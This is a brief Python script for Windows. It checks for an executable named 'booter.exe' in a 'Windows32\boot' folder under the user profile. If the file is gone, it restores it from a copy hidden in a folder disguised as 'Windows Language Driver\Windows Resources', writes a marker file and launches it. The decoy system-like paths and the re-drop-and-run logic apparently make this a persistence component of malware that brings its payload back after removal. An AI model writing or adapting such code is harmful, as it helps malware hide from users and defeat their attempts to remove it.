import os
import time
import sys


user = os.environ['USERNAME']




if not os.path.exists('C:\\Users\\{0}\\Windows32\\boot\\booter.exe'.format(user)):
	time.sleep(10)
	with open('C:\\Users\{0}\\Windows Language Driver\\Windows Resources\\boot'.format(user), 'rb')as boot_rep:
		bootbin = boot_rep.readlines()
		boot_rep.close()
		
	with open('C:\\Users\\{0}\\Windows32\\boot\\booter.exe'.format(user), 'wb')as replace:
		replace.writelines(bootbin)
		replace.close()
		
		
	with open('C:\\Users\\{0}\\Windows32\\boot\\boot_remove'.format(user), 'w')as boot_not:
		boot_not.close()
		
	os.startfile('C:\\Users\\{0}\\Windows32\\boot\\booter.exe'.format(user))
	sys.exit()
	
	